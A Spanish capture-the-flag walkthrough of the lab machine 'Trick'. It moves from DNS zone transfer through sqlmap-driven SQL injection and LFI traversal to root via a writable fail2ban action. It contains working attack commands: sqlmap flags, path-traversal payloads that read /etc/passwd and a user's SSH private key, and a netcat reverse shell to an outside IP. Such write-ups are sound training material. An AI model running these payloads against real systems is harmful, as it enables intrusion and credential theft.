Trick

SQL Injection, LFI y escalada mediante fail2ban

Dificultad: Media · Objetivo: root

Resumen técnico

Esta máquina combina fallos en DNS/web y debilidades de configuración local. La intrusión empieza con transferencia de zona DNS para descubrir subdominios, continúa con inyección SQL en un entorno preproducción, evoluciona a LFI para leer archivos sensibles y termina con acceso SSH al usuario michael. La escalada final se logra alterando la acción de bloqueo de fail2ban gracias a permisos de grupo sobre el directorio de acciones.

1) Descubrimiento de superficie y SQLi

Los servicios expuestos fueron 22, 25, 53 y 80. El DNS permitió transferencia de zona y aparición del subdominio preprod-payroll.trick.htb. El formulario de login resultó vulnerable a SQLi básica y luego validada con sqlmap. 

sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' \
  --data "username=123&password=123" -p username --level 5 --risk 3 --batch --privileges

Con privilegio FILE se leyeron archivos del sistema, incluyendo configuración de Nginx para hallar nuevo virtual host objetivo.

2) LFI y acceso inicial por SSH

En el nuevo sitio se explotó parámetro page con traversal para leer /etc/passwd y después la clave privada /home/michael/.ssh/id_rsa. Esa clave permitió autenticación SSH directa como michael. 

/index.php?page=....//....//....//....//....//etc/passwd
/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa
ssh -i michael_id_rsa michael@10.129.x.x

3) Escalada a root con fail2ban

El usuario no tenía sudo directo para root, pero sí pertenencia al grupo security. Este grupo tenía control del directorio /etc/fail2ban/action.d, permitiendo reemplazar archivos de acción. Se reemplazó iptables-multiport.conf y se modificó actionban para ejecutar una shell inversa cuando fail2ban aplicara un bloqueo. 

mv iptables-multiport.conf iptables-multiport.conf.old
cp iptables-multiport.conf.old iptables-multiport.conf
echo '/usr/bin/nc -e /bin/bash 10.10.16.47 4444' > /tmp/shell.sh
chmod +x /tmp/shell.sh

Tras reiniciar fail2ban y disparar intentos de login inválidos, se ejecutó la acción maliciosa y se recibió shell como root.
